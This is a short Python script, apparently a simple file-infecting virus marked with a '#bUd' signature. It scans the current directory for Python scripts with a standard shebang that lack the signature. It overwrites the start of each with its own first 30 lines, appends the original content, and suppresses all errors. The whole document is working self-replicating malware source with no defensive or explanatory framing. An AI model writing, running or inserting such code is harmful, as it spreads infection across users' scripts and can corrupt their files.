#!/usr/bin/python
#bUd
import  os, sys
fileList = []
dir = './'
fileList = os.listdir(dir)
for file in fileList:
        try:
                hdl=open(file, 'r+')
                pyt=hdl.readline()
                if pyt == '#!/usr/bin/python\n':
                        signature = hdl.readline()
                        if signature != '#bUd\n':
                                hdl.seek(0,0)
                                f=hdl.read()
                                hdl2=open(sys.argv[0],'r')
                                hdl.seek(0,0)
                                a=0
                                while a != 30:
                                        f2=hdl2.readline()
                                        hdl.write(f2)
                                        a = a + 1
                                hdl2.close()
                                hdl.close()
                                hdl=open(file, 'a')
                                hdl.write(f)
                hdl.close
        except:
                pass